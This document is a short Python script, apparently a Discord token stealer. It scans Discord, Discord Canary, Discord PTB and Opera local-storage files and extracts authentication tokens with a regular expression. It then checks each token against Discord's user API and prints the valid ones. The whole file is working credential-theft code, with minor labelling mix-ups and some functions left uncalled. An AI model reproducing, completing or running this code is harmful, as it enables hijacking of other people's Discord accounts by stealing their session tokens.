import os
import re
import requests
import json
saddy = os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb'
saddy2 = os.getenv('APPDATA') + '\\DiscordCanary\\Local Storage\\leveldb'
saddy3 = os.getenv('APPDATA') + '\\discordptb\\Local Storage'
saddy4 = os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb'
saddy5 = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default'



def token1():
    for file in os.listdir(saddy):
        try:
            file = open(saddy+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                r = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token})
                if r.status_code == 200:
                    data = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token}).json()
                    print(f"{token} Discord")
					
						
        except PermissionError:
            print("error")
def token2():
    for file in os.listdir(saddy2):
        try:
            file = open(saddy2+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                r = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token})
                if r.status_code == 200:
                    data = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token}).json()
                    print(f"{token} Discord Canary")
					
						
        except PermissionError:
            print("error")

def token3():
    for file in os.listdir(saddy3):
        try:
            file = open(saddy3+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                r = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token})
                if r.status_code == 200:
                    data = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token}).json()
                    print(f"{token} Discord Canary")				
						
        except PermissionError:
            print("error")			
def token4():
    for file in os.listdir(saddy4):
        try:
            file = open(saddy4+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                r = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token})
                if r.status_code == 200:
                    data = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token}).json()
                    print(f"{token} Discord PTB")
					
						
        except PermissionError:
            print("error")

						

token1()
token2()
